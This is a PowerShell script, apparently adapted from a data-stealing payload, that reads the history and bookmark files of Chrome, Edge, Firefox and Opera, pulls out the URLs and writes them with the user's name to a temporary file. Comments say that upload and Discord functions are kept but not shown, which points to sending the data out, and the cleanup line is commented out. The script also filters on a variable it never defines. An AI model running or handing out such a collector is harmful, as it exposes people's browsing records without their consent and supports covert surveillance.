function Get-BrowserData {

  [CmdletBinding()]
  param (
    [Parameter (Position=1,Mandatory = $True)]
    [string]$Browser,
    [Parameter (Position=1,Mandatory = $True)]
    [string]$DataType
  )

  $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'

  if ($Browser -eq 'chrome' -and $DataType -eq 'history') {
    $Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
  } elseif ($Browser -eq 'chrome' -and $DataType -eq 'bookmarks') {
    $Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"
  } elseif ($Browser -eq 'edge' -and $DataType -eq 'history') {
    $Path = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/History"
  } elseif ($Browser -eq 'edge' -and $DataType -eq 'bookmarks') {
    $Path = "$env:USERPROFILE/AppData/Local/Microsoft/Edge/User Data/Default/Bookmarks"
  } elseif ($Browser -eq 'firefox' -and $DataType -eq 'history') {
    $Path = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"
  } elseif ($Browser -eq 'opera' -and $DataType -eq 'history') {
    $Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History"
  } elseif ($Browser -eq 'opera' -and $DataType -eq 'bookmarks') {
    $Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks"
  }

  $Value = Get-Content -Path $Path | Select-String -AllMatches $regex | % {($_.Matches).Value} | Sort -Unique
  $Value | ForEach-Object {
    $Key = $_
    if ($Key -match $Search) {
      New-Object -TypeName PSObject -Property @{
        User = $env:UserName
        Browser = $Browser
        DataType = $DataType
        Data = $_
      }
    }
  }
}

# Call Get-BrowserData functions for desired browsers and data types
Get-BrowserData -Browser "edge" -DataType "history" | Out-File -FilePath $env:TMP\BrowserData.txt -Append
Get-BrowserData -Browser "edge" -DataType "bookmarks" | Out-File -FilePath $env:TMP\BrowserData.txt -Append
Get-BrowserData -Browser "chrome" -DataType "history" | Out-File -FilePath $env:TMP\BrowserData.txt -Append
Get-BrowserData -Browser "chrome" -DataType "bookmarks" | Out-File -FilePath $env:TMP\BrowserData.txt -Append
Get-BrowserData -Browser "firefox" -DataType "history" | Out-File -FilePath $env:TMP\BrowserData.txt -Append
Get-BrowserData -Browser "opera" -DataType "history" | Out-File -FilePath $env:TMP\BrowserData.txt -Append
Get-BrowserData -Browser "opera" -DataType "bookmarks" | Out-File -FilePath $env:TMP\BrowserData.txt -Append

# Upload and Discord functions remain the same (not modified for this example)

# Remove the line that removes the temporary file (commented out)
# RI $env:TEMP/--BrowserData.txt  

# Keep the PowerShell window open after script execution using two options (choose one):

# Option 1: Using Pause (waits for user input)
Write-Host "Press any key to close..."
$null = $host.ReadLine()

# Option 2: Leaving the window open without requiring user input
# This script will continue to run indefinitely until manually closed  
while ($true) {}

